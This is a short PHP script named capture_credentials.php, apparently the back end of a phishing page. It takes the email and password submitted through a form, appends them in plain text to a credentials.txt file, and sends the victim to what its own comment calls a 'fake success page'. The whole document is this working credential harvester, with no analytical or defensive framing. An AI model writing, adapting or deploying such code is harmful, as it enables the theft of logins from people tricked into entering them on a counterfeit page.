<!-- capture_credentials.php -->
<?php
// Get user credentials
$email = $_POST['email'];
$password = $_POST['password'];

// Save credentials to a file
$file = fopen('credentials.txt', 'a');
fwrite($file, "Email: $email\nPassword: $password\n\n");
fclose($file);

// Redirect to a fake success page
header("Location: success.html");
exit();
?>
